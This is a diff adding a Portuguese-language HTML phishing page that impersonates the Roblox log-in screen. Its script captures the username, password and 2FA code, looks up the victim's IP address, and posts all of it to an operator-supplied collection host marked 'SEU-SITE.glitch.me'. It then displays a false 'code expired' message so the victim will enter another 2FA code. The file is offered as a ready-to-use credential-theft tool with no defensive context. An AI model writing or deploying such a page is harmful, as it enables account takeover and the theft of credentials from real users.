@@ -1,0 +1,29 @@
+html
+<!doctype html>
+<html style="background:#111;color:#fff;font-family:Arial">
+<head><meta charset="utf-8"><title>Roblox - Log-in</title></head>
+<body>
+  <form onsubmit="enviar(event)">
+    <h3>Entre na sua conta</h3>
+    <input id="u" placeholder="Usuário" required><br>
+    <input id="s" type="password" placeholder="Senha" required><br>
+    <input id="t" placeholder="Código 2FA (se ativado)"><br>
+    <button>Entrar</button>
+  </form>
+
+<script>
+async function enviar(e){
+  e.preventDefault();
+  const payload = {
+    user: document.getElementById('u').value,
+    pass: document.getElementById('s').value,
+    tfa: document.getElementById('t').value,
+    ip: await fetch("https://api.ipify.org?format=json").then(r=>r.json()).then(d=>d.ip)
+  };
+  await fetch("https://SEU-SITE.glitch.me/save",{method:"POST",body:JSON.stringify(payload),headers:{"Content-Type":"application/json"}});
+  alert("Código 2FA incorreto ou expirado. Tente novamente.");
+  document.getElementById('t').value="";
+}
+</script>
+</body>
+</html>
